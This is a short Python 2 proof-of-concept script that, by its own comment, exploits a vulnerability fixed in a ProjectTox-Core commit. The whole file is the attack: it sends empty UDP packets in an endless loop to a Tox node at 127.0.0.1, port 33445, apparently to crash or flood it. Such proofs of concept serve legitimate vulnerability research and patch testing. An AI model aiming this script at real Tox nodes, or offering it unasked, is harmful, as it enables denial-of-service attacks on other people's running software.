#This exploits the vulnerability fixed by:
#       https://github.com/irungentoo/ProjectTox-Core/commit/89022326d3742defd9c7b1111ddcda53688d85be

import socket, time

NODE_IP = "127.0.0.1"
NODE_PORT = 33445

print "NODE target IP:", NODE_IP
print "NODE target port:", NODE_PORT

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while 1:
    sock.sendto("", (NODE_IP, NODE_PORT)) 
    time.sleep(0.001)
